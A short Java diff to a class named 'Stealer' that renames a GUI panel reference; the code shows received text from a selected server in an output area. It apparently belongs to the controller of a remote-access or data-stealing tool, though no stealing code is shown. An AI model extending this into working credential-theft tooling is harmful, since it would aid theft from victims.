@@ -17,7 +17,7 @@ public class Stealer
 
 	public static void handle(Server server, String[] args)
 	{
-		if (!server.equals(Network.findWithCombo(Main.mainWindow.panel_tab10.combo_selected_item))) return;
+		if (!server.equals(Main.mainWindow.PanelStealer.getCurrentServer())) return;
 		
 		StringBuffer buffer = new StringBuffer();
 		for (String arg : args)
@@ -25,6 +25,6 @@ public class Stealer
 			buffer.append(arg);
 		}
 		
-		Main.mainWindow.panel_tab10.area_output.setText(buffer.toString());
+		Main.mainWindow.PanelStealer.area_output.setText(buffer.toString());
 	}
 }
